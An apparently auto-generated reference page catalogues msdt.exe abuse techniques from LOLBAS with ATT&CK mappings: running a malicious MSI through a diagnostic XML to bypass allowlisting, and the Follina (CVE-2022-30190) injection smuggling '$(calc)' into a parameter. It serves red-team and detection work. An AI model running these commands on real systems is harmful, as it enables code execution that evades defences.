---
parsed_by: focuslocust
source: commands
type: generated
---
# Msdt Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Msdt.exe

Tool page: [Msdt.exe](../../tools/windows/msdt.exe.md)

### Execute code

```text
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

Description:

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msdt.yml` |
| Evidence | Command preserved from source parser. |

### Execute code bypass Application whitelisting

```text
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

Description:

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msdt.yml` |
| Evidence | Command preserved from source parser. |

### Execute code bypass Application allowlisting

```text
msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
```

Description:

Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

Related ATT&CK:

- [T1202](../../attack/techniques/T1202-indirect-command-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Msdt.yml` |
| Evidence | Command preserved from source parser. |
